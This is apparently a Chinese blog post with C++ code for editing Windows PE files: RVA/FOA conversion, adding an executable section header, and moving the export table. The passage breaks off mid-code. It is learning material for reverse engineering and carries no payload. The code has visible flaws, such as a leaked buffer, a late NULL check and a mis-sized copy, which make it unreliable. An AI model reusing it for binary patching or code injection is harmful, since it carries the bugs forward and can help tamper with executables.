        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文使用的头文件有</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br></pre></td></tr></table></figure><p>写的比较烂，明年年初应该会全部重构一遍（捂脸</p><h1 id="0x01-RVA转换FOA"><a href="#0x01-RVA转换FOA" class="headerlink" title="0x01 RVA转换FOA"></a>0x01 RVA转换FOA</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RVAtoFOA</span><span class="params">(<span class="keyword">int</span> RVA,<span class="keyword">char</span>* FileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> FOA=RVA;</span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">short</span> SizeOfOptionalHeader = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> SectionAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">56</span>);</span><br><span class="line">    <span class="keyword">int</span> FileAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfHeaders = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">84</span>);</span><br><span class="line"><span class="comment">//如果PE文件的内存对齐和文件对齐相等，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (SectionAlignment==FileAlignment)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FOA;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果RVA在PE头，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (RVA&lt;=SizeOfHeaders)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FOA;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//判断节</span></span><br><span class="line">    <span class="keyword">int</span> SectionTable = e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader;</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;NumberOfSections<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        VirtualAddress1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+i*<span class="number">40</span>);</span><br><span class="line">        VirtualAddress2=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+(i+<span class="number">1</span>)*<span class="number">40</span>);</span><br><span class="line">        PointerToRawData=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(i)*<span class="number">40</span>);</span><br><span class="line">        <span class="keyword">if</span>(RVA&gt;=VirtualAddress1&amp;&amp;RVA&lt;VirtualAddress2)</span><br><span class="line">        &#123;</span><br><span class="line">            FOA=RVA-VirtualAddress1+PointerToRawData;</span><br><span class="line">            <span class="keyword">return</span> FOA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualAddress1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    PointerToRawData=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    FOA=RVA-VirtualAddress1+PointerToRawData;</span><br><span class="line">    <span class="keyword">return</span> FOA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="0x02-FOA转换RVA"><a href="#0x02-FOA转换RVA" class="headerlink" title="0x02 FOA转换RVA"></a>0x02 FOA转换RVA</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FOAtoRVA</span><span class="params">(<span class="keyword">int</span> FOA,<span class="keyword">char</span>* FileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> RVA=FOA;</span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">short</span> SizeOfOptionalHeader = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> SectionAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">56</span>);</span><br><span class="line">    <span class="keyword">int</span> FileAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfHeaders = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">84</span>);</span><br><span class="line"><span class="comment">//如果PE文件的内存对齐和文件对齐相等，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (SectionAlignment==FileAlignment)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> RVA;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果FOA在PE头，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (FOA&lt;=SizeOfHeaders)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> RVA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断节</span></span><br><span class="line">    <span class="keyword">int</span> SectionTable = e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader;</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;NumberOfSections<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        VirtualAddress=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+i*<span class="number">40</span>);</span><br><span class="line">        PointerToRawData1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+i*<span class="number">40</span>);</span><br><span class="line">        PointerToRawData2=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(i+<span class="number">1</span>)*<span class="number">40</span>);</span><br><span class="line">        <span class="keyword">if</span>(FOA&gt;=PointerToRawData1&amp;&amp;FOA&lt;PointerToRawData2)</span><br><span class="line">        &#123;</span><br><span class="line">            RVA=FOA+VirtualAddress-PointerToRawData1;</span><br><span class="line">            <span class="keyword">return</span> RVA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualAddress=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    PointerToRawData1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    RVA=FOA+VirtualAddress-PointerToRawData1;</span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//和RVA转换FOA思路基本一样，就不做标注</span></span><br></pre></td></tr></table></figure><br><h1 id="0x03-获取文件长度"><a href="#0x03-获取文件长度" class="headerlink" title="0x03 获取文件长度"></a>0x03 获取文件长度</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fseek</span>(fp,<span class="number">0</span>,SEEK_END);</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">    <span class="built_in">fseek</span>(fp,<span class="number">0</span>,SEEK_SET);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="0x04-添加新节"><a href="#0x04-添加新节" class="headerlink" title="0x04 添加新节"></a>0x04 添加新节</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(FILE* fp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/ll.exe&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE* fp_w = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/a.exe&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp==<span class="literal">NULL</span> || fp_w==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> size = <span class="built_in">getlen</span>(fp);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//分配空间（源文件）</span></span><br><span class="line">    <span class="keyword">char</span>* FileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">short</span> SizeOfOptionalHeader = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> SectionAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">56</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfHeaders = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">84</span>);</span><br><span class="line">    <span class="keyword">int</span> add_section_space = SizeOfHeaders-(e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否有足够的空间来新建表</span></span><br><span class="line">    <span class="keyword">if</span>(add_section_space&lt;<span class="number">80</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not enough memory space!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//分配空间（添加节之后的文件）</span></span><br><span class="line">    FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size+SectionAlignment);</span><br><span class="line">    <span class="built_in">memset</span>(FileBuffer,<span class="number">0</span>,size+SectionAlignment);</span><br><span class="line">    <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file2!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//新增节表</span></span><br><span class="line">*(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>) = NumberOfSections+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>),(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader),<span class="number">40</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">8</span>]=</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>; x&lt;<span class="number">8</span>; x++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">char</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+x)=Name[x];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> VirtualSize = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfRawData = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">20</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">8</span>) = SectionAlignment;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">12</span>) = VirtualAddress+VirtualSize;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">16</span>) = SectionAlignment;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">20</span>) = PointerToRawData+SizeOfRawData;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">24</span>) = <span class="number">0x20000060</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改SizeOfImage</span></span><br><span class="line">    <span class="keyword">int</span> SizeOfImage = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">80</span>);</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">80</span>) = SizeOfImage+SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">    <span class="built_in">fwrite</span>(FileBuffer,<span class="number">1</span>,size+SectionAlignment,fp_w);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放内存</span></span><br><span class="line">    <span class="built_in">free</span>(FileBuffer);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp_w);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回新节的FOA</span></span><br><span class="line">    <span class="keyword">return</span> PointerToRawData+SizeOfRawData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="0x05-扩大节"><a href="#0x05-扩大节" class="headerlink" title="0x05 扩大节"></a>0x05 扩大节</h1><br><h1 id="0x06-合并节"><a href="#0x06-合并节" class="headerlink" title="0x06 合并节"></a>0x06 合并节</h1><br><h1 id="0x07-移动导出表"><a href="#0x07-移动导出表" class="headerlink" title="0x07 移动导出表"></a>0x07 移动导出表</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RVAtoFOA</span><span class="params">(<span class="keyword">int</span> RVA,<span class="keyword">char</span>* FileBuffer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FOAtoRVA</span><span class="params">(<span class="keyword">int</span> FOA,<span class="keyword">char</span>* FileBuffer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(FILE* fp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">movIET</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> section_FOA = <span class="built_in">add</span>();</span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/c.exe&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE* fp2 = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/h.exe&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp==<span class="literal">NULL</span>||fp2==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error to open file!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* FileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">getlen</span>(fp);</span><br><span class="line">    FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">int</span> IET_VirtualAddress=*(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>);</span><br><span class="line">    <span class="keyword">int</span> IET_FOA=<span class="built_in">RVAtoFOA</span>(IET_VirtualAddress,FileBuffer);</span><br><span class="line">    <span class="keyword">int</span> NumberOfFunctions=*(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfFunctions=*(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNameOrdinals = *(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">36</span>);</span><br><span class="line">    <span class="keyword">int</span> NumberOfNames = *(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNames = *(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfFunctions_FOA=<span class="built_in">RVAtoFOA</span>(AddressOfFunctions,FileBuffer);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNameOrdinals_FOA=<span class="built_in">RVAtoFOA</span>(AddressOfNameOrdinals,FileBuffer);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNames_FOA = <span class="built_in">RVAtoFOA</span>(AddressOfNames,FileBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> full_add = NumberOfFunctions*<span class="number">4</span>;</span><br><span class="line">    <span class="comment">//复制AddressOfFunctions</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+section_FOA),(FileBuffer+AddressOfFunctions_FOA),full_add);</span><br><span class="line">    <span class="keyword">int</span> AddressOfFunctions_FOA_new=section_FOA;</span><br><span class="line">    <span class="comment">//复制AddressOfNameOrdinals</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+section_FOA+full_add),(FileBuffer+AddressOfNameOrdinals_FOA),NumberOfNames*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNameOrdinals_FOA_new=section_FOA+full_add;</span><br><span class="line">    full_add+=NumberOfNames*<span class="number">2</span>;</span><br><span class="line">    <span class="comment">//复制AddressOfNames</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+section_FOA+full_add),(FileBuffer+AddressOfNames_FOA), NumberOfFunctions*<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNames_FOA_new=section_FOA+full_add;</span><br><span class="line">    <span class="keyword">int</span> full_add2=section_FOA+full_add+NumberOfFunctions*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> strsize = <span 